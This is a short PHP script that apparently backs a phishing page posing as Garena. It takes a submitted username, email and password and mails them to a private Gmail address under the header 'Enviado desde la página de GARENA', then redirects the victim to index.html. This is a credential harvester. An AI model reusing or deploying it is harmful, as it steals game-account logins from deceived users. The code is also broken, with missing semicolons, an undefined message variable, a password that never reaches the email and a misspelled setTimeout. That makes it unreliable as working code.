<?php
    $destinatario = 'anonymmus3627@gmail.com';

    $usuario = $_POST['usuario'];
    $asunto = $_POST['asunto'];

    $correo = $_POST['correo'];
    $asunto = $_POST['asunto'];

    $contraseña = $_POST['contraseña'];
    $asunto = $_POST['asunto'];

    $header = "Enviado desde la página de GARENA"
    $mensajeCompleto = $mensaje . "\nAtentamente:" . $usuario
     mail($destinatario, $asunto, $mensajeCompleto, $header);
     echo"<script>alert('Correo enviado Exitosamente')</script>";
     echo"<script> setTimeuot(\"location.href='index.html'\",100)</script>";

?>